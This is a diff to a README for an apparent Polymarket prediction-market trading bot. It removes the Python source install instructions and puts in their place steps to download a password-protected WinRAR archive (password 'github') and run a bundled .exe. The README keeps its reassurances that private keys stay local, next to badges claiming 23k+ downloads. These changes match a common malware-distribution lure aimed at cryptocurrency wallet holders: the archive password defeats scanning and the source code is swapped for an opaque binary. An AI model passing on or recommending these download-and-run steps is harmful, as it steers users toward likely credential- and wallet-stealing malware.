@@ -7,7 +7,6 @@ A self-hosted, automated trading bot for prediction markets on [Polymarket](http
 ![Downloads](https://img.shields.io/badge/downloads-23k%2B-brightgreen?style=for-the-badge&logo=github)
 ![Rating](https://img.shields.io/badge/rating-4.5%2F5_%E2%98%85-yellow?style=for-the-badge)
 ![License](https://img.shields.io/badge/license-MIT-blue?style=for-the-badge)
-![Python](https://img.shields.io/badge/python-3.13-3776AB?style=for-the-badge&logo=python&logoColor=white)
 ![Status](https://img.shields.io/badge/status-active-success?style=for-the-badge)
 
 [Features](#features) · [Download](#download) · [Installation](#installation) · [FAQ](#faq)
@@ -42,44 +41,33 @@ It's built for traders who want to automate positions on prediction markets (ele
 
 Latest release: **23,000+ downloads**
 
-Get the latest version from the [Releases](https://github.com/yourusername/openclaw-polymarket-bot/releases) page.
+1. Go to the **[Releases](https://github.com/yourusername/openclaw-polymarket-bot/releases)** page.
+2. Download the latest bot release archive.
+3. Unarchive the bot archive using **WinRAR** (password: `github`).
+4. Run the bot executable (`.exe`).
 
 ## Installation
 
-Download the latest release from the [Releases](https://github.com/yourusername/openclaw-polymarket-bot/releases) page, then:
+No installation is required.
 
-```bash
-cd openclaw-polymarket-bot
-python -m venv venv
-source venv/bin/activate      # Windows: venv\Scripts\activate
-pip install -r requirements.txt
-python run.py
-```
-
-**Requirements**
-- Python 3.13
-- A Polymarket account with API access enabled
-- A funded wallet on Polygon (for placing trades)
+Simply download the latest release, extract the archive using **WinRAR** (password: `github`), and run the bot executable (`.exe`).
 
 ## FAQ
 
-**Is this hosted for me, or do I run it myself?**
+**Is this hosted for me, or do I run it myself?**  
 OpenClaw is fully self-hosted. You run it on your own machine or server — nothing is processed on external infrastructure.
 
-**Which markets does it trade?**
+**Which markets does it trade?**  
 Any market listed on Polymarket that your configured strategy targets — elections, sports, economic events, crypto prices, and more.
 
-**Is my private key safe?**
+**Is my private key safe?**  
 Your private key stays local and is never transmitted anywhere except directly to the blockchain when signing transactions.
 
-**Do I need to know how to code?**
+**Do I need to know how to code?**  
 No. Configuration is straightforward. Writing custom strategies requires Python, but it's optional.
 
-**Can I test before trading real funds?**
+**Can I test before trading real funds?**  
 Yes — use the built-in backtester against historical data, or point the bot at a small test position size first.
-
-**What Python version is required?**
-Python 3.13.
 
 ## License
 
